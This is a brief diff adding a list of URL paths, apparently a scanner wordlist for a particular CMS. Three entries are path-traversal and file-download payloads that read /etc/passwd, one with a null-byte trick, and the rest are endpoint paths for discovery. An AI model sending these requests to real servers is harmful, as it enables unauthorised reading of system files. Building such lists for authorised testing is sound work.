@@ -1,0 +1,11 @@
+/down.jsp?abspathfile=/etc/passwd&filename=passwd
+/front/mailwrite_over.jsp?editpagename=/../../../../../../../../../../../../../etc/passwd%00.ftl
+/vc/vc/columncount/downfile.jsp?savename=a.txt&filename=../../../../../../../../etc/passwd
+/vc/vc/index/que_index.jsp
+/xxgk/setup/
+/vc/
+/xxgk/
+/jsearch/login.do
+/vipchat/
+/jcms/
+/jact/
